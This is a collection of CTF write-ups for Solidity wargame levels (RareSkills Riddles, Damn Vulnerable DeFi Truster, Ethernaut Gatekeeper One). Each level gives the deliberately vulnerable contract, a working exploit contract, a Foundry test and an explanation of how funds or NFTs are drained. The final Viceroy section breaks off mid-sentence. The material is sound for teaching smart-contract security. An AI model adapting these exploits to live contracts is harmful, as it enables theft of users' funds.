# CTF Write Ups 2

## RareSkills Solidity Riddles: Forwarder
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Forwarder.sol

### Contracts
- `src/Week10-11/Forwarder.sol`
```
contract Wallet {
    address public immutable forwarder;

    constructor(address _forwarder) payable {
        require(msg.value == 1 ether);
        forwarder = _forwarder;
    }

    function sendEther(address destination, uint256 amount) public {
        require(msg.sender == forwarder, "sender must be forwarder contract");
        (bool success,) = destination.call{value: amount}("");
        require(success, "failed");
    }
}

contract Forwarder {
    function functionCall(address a, bytes calldata data) public {
        (bool success,) = a.call(data);
        require(success, "forward failed");
    }
}
```
- `test/Week10-11/Forwarder.t.sol`
```
contract ForwarderTest is Test {
    address attackerWallet;
    uint256 attackerWalletBalanceBefore;
    Forwarder forwarderContract;
    Wallet walletContract;

    function setUp() public {
        attackerWallet = address(0xdead);
        forwarderContract = new Forwarder();
        walletContract = (new Wallet){value: 1 ether}(address(forwarderContract));
        attackerWalletBalanceBefore = attackerWallet.balance;
    }

    function testExploit() public {
        bytes memory data = abi.encodeWithSignature("sendEther(address,uint256)", attackerWallet, 1 ether);
        forwarderContract.functionCall(address(walletContract), data);

        _checkSolved();
    }

    function _checkSolved() internal {
        uint256 attackerWalletBalanceAfter = attackerWallet.balance;
        assertApproxEqAbs(
            attackerWalletBalanceAfter - attackerWalletBalanceBefore,
            1 ether,
            1000000000000000 //delta = 0.001
        );
        uint256 walletContractBalance = address(walletContract).balance;
        assertEq(walletContractBalance, 0);
    }
}
```

### Exploit
Cracking this exploit requires knowing how `.call` and `abi.encodeWithSignature` works. But simply, `call` is a low level function used to interact with another contract; and `abi.encodeWithSignature` is used to encode function calls including the function signature and its arguments. The latter returns a bytes array representing an encoded function call that can be used to make a call to another contract's function with the encoded arguments.

Since `sendEther` in `Wallet` can only be called by the `Forwarder`, and `functionCall` in `Forwarder` takes in an arbitrary `data` input which is passed to `call`, we can easily get the `Wallet` contract to send its balance to the attackers wallet by passing in the following as `data``:
```
    bytes memory data = abi.encodeWithSignature("sendEther(address,uint256)", attackerWallet, 1 ether);
    forwarderContract.functionCall(address(walletContract), data);
```
The first line constructs the encoded `sendEther` function call with the attacker's wallet as the destination and 1 ether as the amount to send. When this is passed to `functionCall`, the `Forwarder` contract sends a call to `walletContract` to execute the encoded function call. Thus transfering out the balance to the attacker.

## RareSkills Solidity Riddles: Overmint3
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Overmint3.sol

### Contracts
- `src/Week10-11/Overmint3.sol`
```
contract Overmint3 is ERC721 {
    using Address for address;

    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint3", "AT") {}

    function mint() external {
        require(!isContract(msg.sender), "no contracts");
        require(amountMinted[msg.sender] < 1, "only 1 NFT");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    //`isContract()` has been removed from OpenZeppelin's `Address` library in V5
    function isContract(address _addr) public view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(_addr)
        }
        return size > 0;
    }
}

contract Exploit {
    Overmint3 public overmint3Contract;
    address public attackerWallet;

    constructor(Overmint3 _overmint3Contract, address _attackerWallet) {
        overmint3Contract = _overmint3Contract;
        attackerWallet = _attackerWallet;
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
    }

    function retrieve() public payable {
        uint256 balance = overmint3Contract.totalSupply();
        for (uint256 i = 1; i <= balance; i++) {
            overmint3Contract.transferFrom(address(this), attackerWallet, i);
        }
    }
}

contract ExploitMedium {
    Overmint3 public overmint3Contract;
    Exploit public exploitContract;

    constructor(Overmint3 _overmint3Contract, Exploit _exploitContract) {
        overmint3Contract = _overmint3Contract;
        exploitContract = _exploitContract;
        overmint3Contract.mint();
        uint256 tokenId = overmint3Contract.totalSupply();
        overmint3Contract.transferFrom(address(this), address(exploitContract), tokenId);
    }
}
```
- `test/Week10-11/Overmint3.t.sol`
```
contract Overmint3Test is Test {
    Overmint3 overmint3Contract;
    address attackerWallet;
    Exploit exploitContract;

    function setUp() public {
        overmint3Contract = new Overmint3();
        attackerWallet = address(0xbad);
        exploitContract = new Exploit(overmint3Contract, attackerWallet);
    }

    function testExploit() public {
        vm.startPrank(attackerWallet);
        exploitContract.retrieve();
        vm.stopPrank();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertEq(overmint3Contract.balanceOf(attackerWallet), 5);
        assertTrue(vm.getNonce(address(attackerWallet)) <= 1, "must exploit in one transaction");
    }
}
```

### Exploit
The exploit requires understanding that when a function call is made from the constructor of a contract, `extcodesize` of the msg.sender will be `0` since the contract code is only stored at the end of the constructor execution. So this will bypass the `isContract` check in the `mint` function when its called from another contract's constructor.

One might be tempted to use the `onERC721Received` hook in `IERC721Receiver` to try to reenter the mint function to continuously mint NFTs in a single call, but this attack vector will fail. The reason is because if our attack was initiated in the constructor, then there will be no `onERC721Received` hook in the attacking contract available to be called yet since the constructor has not competed its execution. This would only allow 1 NFT to be minted to the attacking contract.

Instead, we could deploy 5 secondary attack contracts that solely exists to call `mint` once in each of their constructors, and then transfer the minted NFT to the primary attacking contract (or to `attackerWallet` for the matter). The primary attacking contract only needs to create 5 instances of the secondary attaking contract in its constructor, and these secondary attacking contracts will then mint and transfer an NFT to the primary contract within their constructor. At the end of the contract deployments, `attackerWallet` just has to call `retrieve` on `Exploit` to transfer out all minted NFTs.

## RareSkills Solidity Riddles: Democracy
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Democracy.sol

### Contracts
- `src/Week10-11/Democracy.sol` (Note that this is updated slightly: L103 - 126, for compatibility with OpenZeppelin V5)
```
contract Democracy is Ownable, ERC721 {
    uint256 public PRICE = 1_000 ether;
    uint256 public TOTAL_SUPPLY_CAP = 10;

    address public incumbent;
    address public challenger;
    mapping(address => bool) public voted;
    mapping(address => uint256) public votes;
    bool public electionCalled = false;

    modifier electionNotYetCalled() {
        require(!electionCalled, "DemocracyNft: Election has ended");
        _;
    }

    modifier contractBalanceIsGreaterThanZero() {
        require(address(this).balance > 0, "DemocracyNft: Insufficient contract balance");
        _;
    }

    modifier nomineeIsValid(address nominee) {
        require(nominee == incumbent || nominee == challenger, "DemocracyNft: Must vote for incumbent or challenger");
        _;
    }

    modifier hodlerNotYetVoted() {
        require(!voted[msg.sender], "DemocracyNft: One hodler, one vote");
        _;
    }

    modifier callerIsNotAContract() {
        require(tx.origin == msg.sender, "DemocracyNft: Feature available to EOAs only");
        _;
    }

    constructor() payable ERC721("Democracy NFT", "DMRCY") Ownable(msg.sender) {
        incumbent = owner();
    }

    function nominateChallenger(address challenger_) external {
        require(challenger == address(0), "DemocracyNft: Challenger already nominated");

        challenger = challenger_;

        // Rig the election!
        _rigElection();
    }

    function vote(address nominee)
        external
        contractBalanceIsGreaterThanZero
        electionNotYetCalled
        nomineeIsValid(nominee)
        hodlerNotYetVoted
    {
        // Check NFT balance
        uint256 hodlerNftBalance = balanceOf(msg.sender);
        require(hodlerNftBalance > 0, "DemocracyNft: Voting only for NFT hodlers");

        // Log votes
        votes[nominee] += hodlerNftBalance;
        voted[msg.sender] = true;

        // Tip hodler for doing their civic duty
        payable(msg.sender).call{value: address(this).balance / 10}("");

        // Once all hodlers have voted, call election
        if (votes[incumbent] + votes[challenger] >= TOTAL_SUPPLY_CAP) {
            _callElection();
        }
    }

    function mint(address to, uint256 tokenId) external payable callerIsNotAContract onlyOwner {
        require(msg.value >= PRICE, "DemocracyNft: Insufficient transaction value");

        _mint(to, tokenId);
    }

    //Updated slighlty for compatibility with OZ v5
    //----------------------------------------------------
    function approve(address to, uint256 tokenId) public override callerIsNotAContract {
        _approve(to, tokenId, _msgSender());
    }

    // function transferFrom(address from, address to, uint256 tokenId) public override callerIsNotAContract {
    //     require(_isAuthorized(ownerOf(tokenId), _msgSender(), tokenId), "ERC721: caller is not token owner or approved");

    //     _transfer(from, to, tokenId);
    // }

    // function safeTransferFrom(
    //     address from,
    //     address to,
    //     uint256 tokenId,
    //     bytes memory
    // )
    //     public
    //     override
    //     callerIsNotAContract
    // {
    //     require(_isAuthorized(ownerOf(tokenId), _msgSender(), tokenId), "ERC721: caller is not token owner or approved");

    //     _safeTransfer(from, to, tokenId, "");
    // }
    //----------------------------------------------------

    function withdrawToAddress(address address_) external onlyOwner {
        payable(address_).call{value: address(this).balance}("");
    }

    function _callElection() private {
        electionCalled = true;

        if (votes[challenger] > votes[incumbent]) {
            incumbent = challenger;
            _transferOwnership(challenger);

            challenger = address(0);
        }
    }

    function _rigElection() private {
        // Mint voting tokens to challenger
        _mint(challenger, 0);
        _mint(challenger, 1);

        // Make it look like a close election...
        votes[incumbent] = 5;
        votes[challenger] = 3;
    }
}

contract ExploitInitial is IERC721Receiver {
    Democracy democracyContract;
    address challenger;
    ExploitFinal exploitFinalContract;

    constructor(Democracy _democracyContract, address _challenger, ExploitFinal _exploitFinalContract) {
        democracyContract = _democracyContract;
        challenger = _challenger;
        exploitFinalContract = _exploitFinalContract;
    }

    receive() external payable {
        democracyContract.safeTransferFrom(address(this), address(exploitFinalContract), 1);
    }

    function attack() public {
        democracyContract.vote(challenger);
    }

    function onERC721Received(
        address, /*operator*/
        address, /*from*/
        uint256, /*tokenId*/
        bytes calldata /*data*/
    )
        external
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }
}

contract ExploitFinal is IERC721Receiver {
    Democracy democracyContract;
    address challenger;

    constructor(Democracy _democracyContract, address _challenger) {
        democracyContract = _democracyContract;
        challenger = _challenger;
    }

    receive() external payable {}

    function onERC721Received(
        address, /*operator*/
        address, /*from*/
        uint256, /*tokenId*/
        bytes calldata /*data*/
    )
        external
        returns (bytes4)
    {
        democracyContract.vote(challenger);
        return IERC721Receiver.onERC721Received.selector;
    }
}
```
- `test/Week10-11/Democracy.t.sol`
```
contract DemocracyTest is Test {
    Democracy democracyContract;
    address owner;
    address attackerWallet;

    ExploitInitial exploitInitialContract;
    ExploitFinal exploitFinalContract;

    function setUp() public {
        democracyContract = new Democracy{value: 1 ether}();
        owner = address(0xdead);
        attackerWallet = address(0xbad);

        exploitFinalContract = new ExploitFinal(democracyContract, attackerWallet);
        exploitInitialContract = new ExploitInitial(democracyContract, attackerWallet, exploitFinalContract);
    }

    function testExploit() public {
        democracyContract.nominateChallenger(attackerWallet);
        assertEq(democracyContract.balanceOf(attackerWallet), 2);

        vm.startPrank(attackerWallet);
        democracyContract.safeTransferFrom(attackerWallet, address(exploitInitialContract), 1);
        democracyContract.vote(attackerWallet);

        exploitInitialContract.attack();
        democracyContract.withdrawToAddress(attackerWallet);
        vm.stopPrank();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertEq(address(democracyContract).balance, 0);
    }
}
```

### Exploit
In the `Democracy` contract, there is no stopping `challenger` from voting for themselves. Realistically, this should be prohibited, and if that's the case, a Factory pattern should be used for the exploit. That is, we should have a Factory contract that can be called to create Attack contracts, and within each Attack contract, it should have some logic for voting once, and then creating another Attack contract and transfering an NFT to that newly created attack contract so that it can also vote, all in a single function call - so this recursive calling workflow should be used in the `receive` function.

In this exploit, it will be taken that `challenger` can vote for themselves.

When `nominateChallenger` is called, two NFT tokens are minted to the challenger. However, since the election is rigged, the votes will be set to `incumbent (I) = 5`, and `challenger (C) = 3`. Note that in the `vote` function, once the total votes sums up to `10`, the elections will be ended, and the winner of the election will be the new owner of the contract, who can then withdraw the balance. For each `vote`, the number of votes is incremented by the NFT balance of `msg.sender`, thus if the challenger calls `vote` right away, the election will end at `5(I), 5(C)`, and the challenger will lose since in order for the challenger to win, they need more votes than the incumbent.

To complete the exploit, the challenger calls `safeTransferFrom` to transfer one NFT to the first attacking contract: `ExploitInitial`. The challenger can then vote for themselves and this will only increase the vote to `5(I), 4(C)` since the challenger is only holding one NFT. 

The challenger calls `attack` from `ExploitInitial`, which in turn calls a `vote` for the challenger. This will increase the vote to `5(I), 5(C)` since `ExploitInitial` has one NFT from the challenger. The vote function in `Democracy` sends some Ether to msg.sender when they cast a vote, and `ExploitInitial` has a `receive` function that will call `safeTransferFrom` to transfer an NFT from `ExploitInitial` to `ExploitFinal`. As `ExploitInitial` receives Ether from `Democracy`, it will then transfer it's NFT to `ExploitFinal`; and in `ExploitFinal`, `onERC721Received` will call another `vote` for challenger, thereby increasing the vote to `5(I), 6(C)`. The execution flow stops, and the election will end since the total votes is more than `10`. Now the challenger will have more votes than the incumbent and they can then withdraw the balance from `Democracy`.


## Damn Vulnerable DeFi (Foundry): Truster
Link: https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/truster

### Contracts
- `src/Week10-11/TrusterLenderPool.sol`
```
contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
}

contract Exploit {
    TrusterLenderPool public trusterLenderPool;
    DamnValuableToken public dvt; //ERC20-like

    constructor(TrusterLenderPool _trusterLenderPool, DamnValuableToken _dvt) {
        trusterLenderPool = _trusterLenderPool;
        dvt = _dvt;
    }

    function exploit() public {
        uint256 approveAmount = 1_000_000 ether;
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), approveAmount);
        trusterLenderPool.flashLoan(0 ether, address(this), address(dvt), data);
        dvt.transferFrom(address(trusterLenderPool), msg.sender, approveAmount);
    }
}
```
- `test/Week10-11/TrusterLenderPool.t.sol`
```
contract TrusterLenderPoolTest is Test {
    TrusterLenderPool pool;
    DamnValuableToken token;
    Exploit exploitContract;
    address deployer;
    address player;

    function setUp() public {
        token = new DamnValuableToken();
        pool = new TrusterLenderPool(token);
        assertEq(address(pool.token()), address(token));

        token.transfer(address(pool), 1_000_000 * 10 ** 18);
        assertEq(token.balanceOf(address(pool)), 1_000_000 * 10 ** 18);
        assertEq(token.balanceOf(player), 0);

        exploitContract = new Exploit(pool, token);
    }

    function testExploit() public {
        vm.startPrank(player);
        exploitContract.exploit();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertEq(token.balanceOf(player), 1_000_000 * 10 ** 18);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}
```

### Exploit
In the `flashLoan` function, `target` does not have any restriction on the addresses we can use, and so an external call can be made in the line: `target.functionCall(data)`, in which arbitrary data can be called on an arbitrary contract. In other words, we can call any function on any contract that we pass as `target` and `data`. Thus, we can encode an `approve` on the token contract to allow `Exploit` to transfer tokens from `TrusterLenderPool` to `player` who will be the msg.sender.

In the `exploit` function, we encode the approve call to allow `Exploit` to move `TrusterLenderPool`'s DVT balance as `abi.encodeWithSignature("approve(address,uint256)", address(this), approveAmount);` where `address(this) == address(Exploit)` and `approveAmount == 1_000_000 ether`. When we call the `flashLoan` function, we have to pass in `amount = 0` so that we can avoid triggering the `RepayFailed` revert. The encoded function call will then be sent to the DVT contract to approve `Exploit` to call `transferFrom` on `TrusterLenderPool`. And after that, we can just transfer DVT tokens from the pool contract to `player`.

## Ethernaut: #13 Gatekeeper 1
Link: https://ethernaut.openzeppelin.com/level/0xb5858B8EDE0030e46C0Ac1aaAedea8Fb71EF423C

### Contracts
- `src/Week10-11/GateKeeperOne.sol`
```
contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Exploit {
    GatekeeperOne public gateKeeperOne;
    address public player;

    constructor(GatekeeperOne _gateKeeperOne, address _player) {
        gateKeeperOne = _gateKeeperOne;
        player = _player;
    }

    function attack() public {
        bytes8 gateKey = bytes8(uint64(uint160(player))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i <= 8191;) {
            try gateKeeperOne.enter{gas: 85000 + i}(gateKey) {
                break;
            } catch {
                i++;
            }
        }
    }
}
```
- `test/Weel10-11/GateKeeperOne.t.sol`
```
contract GatekeeperOneTest is Test {
    GatekeeperOne gateKeeperOne;
    address player;
    Exploit exploitContract;

    function setUp() public {
        gateKeeperOne = new GatekeeperOne();
        player = tx.origin;
        exploitContract = new Exploit(gateKeeperOne, player);
    }

    function testExploit() public {
        vm.startPrank(player);
        exploitContract.attack();
        assertEq(gateKeeperOne.entrant(), player);
    }
}
```

### Exploit
#### Gate One:
In `require(msg.sender != tx.origin)`; basically, we just need to call `GatekeeperOne.enter()` from a contract, so that
`tx.origin` is the EOA address, and `msg.sender` is the contract address.

#### Gate Two:
In `require(gasleft() % 8191 == 0)` we need to call `GatekeeperOne.enter()` with a gas amount that is a multiple of 8191.
The `gasleft` function is a global function that returns the remaining gas amount in the current transaction, after executing all the opcodes. So we need to call the function with a specific amount of gas such that it will make the `gasleft() % 8191 == 0` condition true. It's difficult to guess the precise amount of gas, but we can brute force it. The gas used by the `enter` function must be at least 8191 + all the gas needed to execute the opcodes, so we can use a loop with a try-catch and a starting base amount of gas (to prevent out of gas revert) and keep incrementing it until it works.

#### Gate Three:
#### First requirement:
The first requirement: `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`. The right side only takes the least significant 16 bits (2 bytes) of _gateKey, and the left side takes the least significant 32 bits (4 bytes) of _gateKey. But we need to make sure that the 2 bytes on the right side are the same as the 2 least significant bytes on the left. Thus we have to remove the 2 most significant bytes on the left with a bitmask. So for example, to make `0x12345678' equal to `0x00005678`, we can execute `0x12345678 & 0x0000FFFF`. This will make the left side equal to the right side with the mask of `0x0000FFFF`.

The second requirement: `uint32(uint64(_gateKey)) != uint64(_gateKey)`. The right side will take the least significant 64 bits (8 bytes) of _gateKey, and the left side will take the least significant 32 bits (4 bytes) of _gateKey. Here we need to maintain the first requirement, and also ensure that if a mask is applied here, the value on both sides will be different.
Using the mask from the first requirement will not work here, because the left side will be equal to the right side.
So considering that the left only takes the least significant 4 bytes, and the right take the least significant 8 bytes,
we just need to also preserve the most significant 4 bytes on the value on the right side. Thus, we can use a mask of
`0xFFFFFFFF0000FFFF` which builds on top of the first mask. So if _gateKey was `0x1234567812345678`, applying this mask: `0x1234567812345678 & 0xFFFFFFFF0000FFFF` will make it `0x1234567800005678`. So this will make the left side `0x00005678` and the right side will remain as `0x1234567800005678`.

The third requirement: `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))`. The right side will take the least
significant 2 bytes of `tx.origin`, and the left side will take the least significant 4 bytes of `_gateKey`. We just need to
apply the `0xFFFFFFFF0000FFFF` mask to the address of `tx.origin` (the `player`) converted to a `bytes8` type. To covert an
address to a bytes8 type, we just need to cast it appropriately (an `address` is a 20 bytes type): address -> uint160 ->
uint64 -> bytes8. This would be: `bytes8(uint64(uint160(address(player)))) & 0xFFFFFFFF0000FFFF`.

Keep in mind that bytes types are left aligned, and numeric types are right aligned. Something like casting bytes8 to uint64 is akin to converting the bytes8 value to a uint64 value, and vice versa.
```
address(0x9AebA12E57837B35cb322E857A8114792248f1B9) -> 
0x9AebA12E57837B35cb322E857A8114792248f1B9

uint160(address(0x9AebA12E57837B35cb322E857A8114792248f1B9)) -> 0x0000000000000000000000009aeba12e57837b35cb322e857a8114792248f1b9

uint64(uint160(address(0x9AebA12E57837B35cb322E857A8114792248f1B9))) -> 0x0000000000000000000000000000000000000000000000007a8114792248f1b9

bytes8(uint64(uint160(address(0x9AebA12E57837B35cb322E857A8114792248f1B9)))) -> 
0x7a8114792248f1b9

0x7a8114792248f1b9 & 0xFFFFFFFF0000FFFF ->
0x7a8114790000f1b9

uint64(0x7a8114790000f1b9) ->                                           0x0000000000000000000000000000000000000000000000007a8114790000f1b9

uint32(uint64(0x7a8114790000f1b9)) ->                                   0x000000000000000000000000000000000000000000000000000000000000f1b9

uint16(uint160(0x9AebA12E57837B35cb322E857A8114792248f1B9)) ->          0x000000000000000000000000000000000000000000000000000000000000f1b9
```

## RareSkills Solidity Riddles: Delete User
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/DeleteUser.sol

### Contracts
- `src/Week10-11/DeleteUser.sol`
```
contract DeleteUser {
    struct User {
        address addr;
        uint256 amount;
    }

    User[] private users;

    function deposit() external payable {
        users.push(User({addr: msg.sender, amount: msg.value}));
    }

    function withdraw(uint256 index) external {
        User storage user = users[index];
        require(user.addr == msg.sender);
        uint256 amount = user.amount;

        user = users[users.length - 1];
        users.pop();

        msg.sender.call{value: amount}("");
    }
}

contract Exploit {
    DeleteUser public deleteUserContract;

    constructor(DeleteUser _deleteUserContract) {
        deleteUserContract = _deleteUserContract;
    }

    receive() external payable {}

    function exploit() public {
        deleteUserContract.deposit{value: 1 ether}();
        deleteUserContract.deposit{value: 0 ether}();
        deleteUserContract.withdraw(0);
        deleteUserContract.withdraw(0);
    }
}
```
- `test/Week10-11/DeleteUser.t.sol`
```
contract DeleteUserTest is Test {
    DeleteUser deleteUserContract;
    Exploit exploitContract;
    address attackerWallet;

    function setUp() public {
        deleteUserContract = new DeleteUser();
        attackerWallet = address(0xbadbad);
        exploitContract = new Exploit(deleteUserContract);
        vm.deal(address(deleteUserContract), 1 ether);
        vm.deal(address(exploitContract), 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attackerWallet);
        exploitContract.exploit();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertEq(address(deleteUserContract).balance, 0);
        assertTrue(vm.getNonce(address(attackerWallet)) <= 1, "must exploit in one transaction");
    }
}
```

### Exploit
The vulnerability in `DeleteUser` is that in the `withdraw` function:
```
    function withdraw(uint256 index) external {
        User storage user = users[index];
        require(user.addr == msg.sender);
        uint256 amount = user.amount;

        user = users[users.length - 1];
        users.pop();

        msg.sender.call{value: amount}("");
    }
```
The function has the intention to remove the `user` item from the `users` array after the user has withdrawn the item's deposit. The function tries to replace the data at `users[index]` with `users[users.length - 1]` which is the last element in the `users` array, so that by popping the array, the last item - which was already copied to the withdrawn item's position, will be popped from the array and the reduction in array items get accounted for.

However, the problem is that in Solidity, writes to storage pointers do not save new data. The line `User storage user = users[index]` creates a pointer to a location in the contract storage, so `user` is essentially a reference to `users[index]`. However, `user = users[users.length - 1]` is merely just changing the reference that `user` is pointing to, and it does not write to actual storage. So when the function subsequently calls `users.pop()`, its only just popping the last item in the `users` array, without actually popping the array item of the given `index`.

So to exploit, we just have to create multiple deposits, one with 1 ether, and the other with 0 ether. And we can essentially call `withdraw` with the first deposit's index twice to successfully withdraw 1 ether more than once, and steal all the ether in the `DeleteUser` contract.

## RareSkills Solidity Riddles: Viceroy
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Viceroy.sol

### Contracts
- `src/Week10-11/Viceroy.sol`
```
contract OligarchyNFT is ERC721 {
    constructor(address attacker) ERC721("Oligarch", "OG") {
        _mint(attacker, 1);
    }

    // function _beforeTokenTransfer(address from, address, uint256, uint256) internal virtual override {
    //     require(from == address(0), "Cannot transfer nft"); // oligarch cannot transfer the NFT
    // }
}

contract Governance {
    IERC721 private immutable oligargyNFT;
    CommunityWallet public immutable communityWallet;
    mapping(uint256 => bool) public idUsed;
    mapping(address => bool) public alreadyVoted;

    struct Appointment {
        //approvedVoters: mapping(address => bool),
        uint256 appointedBy; // oligarchy ids are > 0 so we can use this as a flag
        uint256 numAppointments;
        mapping(address => bool) approvedVoter;
    }

    struct Proposal {
        uint256 votes;
        bytes data;
    }

    mapping(address => Appointment) public viceroys;
    mapping(uint256 => Proposal) public proposals;

    constructor(ERC721 _oligarchyNFT) payable {
        oligargyNFT = _oligarchyNFT;
        communityWallet = new CommunityWallet{value: msg.value}(address(this));
    }

    /*
     * @dev an oligarch can appoint a viceroy if they have an NFT
     * @param viceroy: the address who will be able to appoint voters
     * @param id: the NFT of the oligarch
     */
    function appointViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(!idUsed[id], "already appointed a viceroy");
        require(viceroy.code.length == 0, "only EOA");

        idUsed[id] = true;
        viceroys[viceroy].appointedBy = id;
        viceroys[viceroy].numAppointments = 5;
    }

    function deposeViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(viceroys[viceroy].appointedBy == id, "only the appointer can depose");

        idUsed[id] = false;
        delete viceroys[viceroy];
    }

    function approveVoter(address voter) external {
        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
        require(voter != msg.sender, "cannot add yourself");
        require(!viceroys[msg.sender].approvedVoter[voter], "cannot add same voter twice");
        require(viceroys[msg.sender].numAppointments > 0, "no more appointments");
        require(voter.code.length == 0, "only EOA");

        viceroys[msg.sender].numAppointments -= 1;
        viceroys[msg.sender].approvedVoter[voter] = true;
    }

    function disapproveVoter(address voter) external {
        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
        require(viceroys[msg.sender].approvedVoter[voter], "cannot disapprove an unapproved address");
        viceroys[msg.sender].numAppointments += 1;
        delete viceroys[msg.sender].approvedVoter[voter];
    }

    function createProposal(address viceroy, bytes calldata proposal) external {
        require(
            viceroys[msg.sender].appointedBy != 0 || viceroys[viceroy].approvedVoter[msg.sender],
            "sender not a viceroy or voter"
        );

        uint256 proposalId = uint256(keccak256(proposal));
        proposals[proposalId].data = proposal;
    }

    function voteOnProposal(uint256 proposal, bool inFavor, address viceroy) external {
        require(proposals[proposal].data.length != 0, "proposal not found");
        require(viceroys[viceroy].approvedVoter[msg.sender], "Not an approved voter");
        require(!alreadyVoted[msg.sender], "Already voted");
        if (inFavor) {
            proposals[proposal].votes += 1;
        }
        alreadyVoted[msg.sender] = true;
    }

    function executeProposal(uint256 proposal) external {
        require(proposals[proposal].votes >= 10, "Not enough votes");
        (bool res,) = address(communityWallet).call(proposals[proposal].data);
        require(res, "call failed");
    }
}

contract CommunityWallet {
    address public governance;

    constructor(address _governance) payable {
        governance = _governance;
    }

    function exec(address target, bytes calldata data, uint256 value) external {
        require(msg.sender == governance, "Caller is not governance contract");
        (bool res,) = target.call{value: value}(data);
        require(res, "call failed");
    }

    fallback() external payable {}
}

contract ExploitMain {
    using Create2Sample for address;

    function exploit(Governance governance, address attackerWallet) public {
        //Precompute viceroy address
        bytes memory viceroyByteCode = getViceroyByteCode(address(governance), attackerWallet);
        address viceroyPrecomputeAddress = address(this).precomputeAddress(bytes32(uint256(99)), viceroyByteCode);

        //Appoint viceroy with precomputed address
        //Precomputed address will not have any code so it will be considered EOA
        governance.appointViceroy(viceroyPrecomputeAddress, 1);

        //Deploy ExploitViceroyEOA with precomputed address
        new ExploitViceroyEOA{salt: bytes32(uint256(99))}(address(governance), attackerWallet);
    }

    function getViceroyByteCode(
        address _governanceAddress,
        address attackerWallet
    )
        public
        pure
        returns (bytes memory)
    {
        bytes memory creationCode = type(ExploitViceroyEOA).creationCode;
        return abi.encodePacked(creationCode, abi.encode(_governanceAddress, attackerWallet));
    }
}

contract ExploitViceroyEOA {
    using Create2Sample for address;

    Governance public governanceContract;

    //Calls to Governance must be made in constructor to bypass EOA checks
    constructor(address _governanceAddress, address attackerWallet) {
        //create proposal to send funds to attackerWallet
        governanceContract = Governance(_governanceAddress);
        bytes memory proposal = abi.encodeWithSignature("exec(address,bytes,uint256)", attackerWallet, "", 10 ether);
        uint256 proposalId = uint256(keccak256(proposal));
        governanceContract.createProposal(address(this), proposal);

        //Batch create ExploitVoterEOA contracts to vote on proposal
        for (uint256 i; i < 10; i++) {
            bytes memory voterCreationCode = type(ExploitVoterEOA).creationCode;
            bytes memory voterByteCode = abi.encodePacked(voterCreationCode, abi.encode(_governanceAddress, proposalId));
            address voterPrecomputeAddress = address(this).precomputeAddress(bytes32(uint256(i)), voterByteCode);

            //Approve voter since precomputed address will be considered EOA
            governanceContract.approveVoter(voterPrecomputeAddress);

            //Deploy ExploitVoterEOA with precomputed address
            //Constructor will vote for the proposal
            new ExploitVoterEOA{salt: bytes32(uint256(i))}(governanceContract, proposalId);

            //Disapprove voter to exploit delete vulnerability
            governanceContract.disapproveVoter(voterPrecomputeAddress);
        }

        //Execute proposal to send funds to attackerWallet
        governanceContract.executeProposal(proposalId);
    }
}

contract ExploitVoterEOA {
    //To be deployed by ExploitViceroyEOA (msg.sender).
    //Calls to Governance must be made in constructor to bypass EOA checks
    constructor(Governance governance, uint256 proposalId) {
        governance.voteOnProposal(proposalId, true, msg.sender);
    }
}

library Create2Sample {
    function precomputeAddress(
        address contractDeployer,
        bytes32 salt,
        bytes memory contractByteCode
    )
        public
        pure
        returns (address)
    {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), contractDeployer, salt, keccak256(contractByteCode)));
        return address(uint160(uint256(hash)));
    }
}
```

### Exploit
Refer to https://solidity-by-example.org/app/create2/ and https://www.rareskills.io/post/ethereum-contract-creation-code

TLDR, to precompute a contract's address: contract creationCode -> contract bytecode -> hashing step including casting last 20 bytes of hash to address type. (Refer to above links for better explanation).

The rules of engaging with `Governance` are:
